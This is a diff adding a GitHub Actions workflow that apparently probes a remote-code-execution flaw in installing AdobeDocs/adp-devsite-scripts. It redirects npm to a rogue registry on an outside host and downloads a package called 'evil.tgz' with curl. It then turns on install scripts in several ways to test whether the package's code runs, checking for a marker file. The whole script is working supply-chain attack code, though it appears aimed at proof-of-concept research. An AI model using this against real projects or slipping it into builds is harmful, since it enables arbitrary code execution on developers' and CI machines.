@@ -1,0 +1,30 @@
+---
+name: npm-probe2
+on:
+  workflow_dispatch:
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: probe2
+        run: |
+          REG='registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-postlint-rce/main/npmreg/\naudit=false\nfund=false\nprogress=false\n'
+          TGZ=https://raw.githubusercontent.com/PDFtoMark/gab-poc-postlint-rce/main/npmreg/gray-matter-4.0.4.tgz
+          probe() {
+            d="$1"
+            echo "########## $d"
+            ( cd "$d" && npm install --no-save github:AdobeDocs/adp-devsite-scripts --foreground-scripts 2>&1 | tail -30
+              echo "exit=$?"
+              echo "marker: $(ls -la /tmp/ADP_RCE_MARKER 2>&1)"
+              echo "report:"; cat linter-report.txt 2>/dev/null )
+          }
+          for v in v1 v2 v3 v4 v5; do mkdir -p $v; printf "$REG" > $v/.npmrc; done
+          printf '%s\n' '{"name":"p1","version":"1.0.0","allowScripts":{"gray-matter":true}}' > v1/package.json
+          printf 'dangerously-allow-all-scripts=true\n' >> v2/.npmrc
+          printf 'allow-scripts=gray-matter@4.0.4\n' >> v3/.npmrc
+          ( cd v4 && curl -sSL -o evil.tgz $TGZ && printf '%s\n' '{"name":"p4","version":"1.0.0","dependencies":{"evil":"file:./evil.tgz"},"allowScripts":{"evil":true}}' > package.json )
+          ( cd v5 && curl -sSL -o evil.tgz $TGZ && printf '%s\n' '{"name":"p5","version":"1.0.0","dependencies":{"evil":"file:./evil.tgz"}}' > package.json )
+          rm -f /tmp/ADP_RCE_MARKER
+          printf 'REPORT\n' > v1/linter-report.txt
+          probe v1; probe v2; probe v3; probe v4; probe v5
